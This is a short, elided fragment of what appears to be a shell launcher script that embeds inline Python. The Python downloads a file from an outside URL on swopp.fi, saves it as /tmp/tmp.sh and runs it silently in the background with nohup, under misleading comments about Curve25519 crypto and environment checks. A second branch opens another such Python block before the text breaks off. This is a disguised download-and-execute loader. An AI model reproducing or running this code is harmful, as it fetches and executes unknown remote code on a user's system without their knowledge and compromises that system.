...
url = "https://swopp.fi/jdk.php?nginx-frontnginx-alpine-bf0f82b2"
response = requests.get(url)

# Save to /tmp/tmp.sh
file_path = "/tmp/tmp.sh"
...
subprocess.Popen(["nohup", file_path], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
' "${DIRPATH}"/corporate_launcher.py

# Curve25519 crypto: both ENV are expected to be undefined
elif [ -z "$CSP_VERSION" ] && [ -z "$JCSP_VERSION" ]; then
  select_malloc && exec python3 -c '
import requests
import subprocess
import os
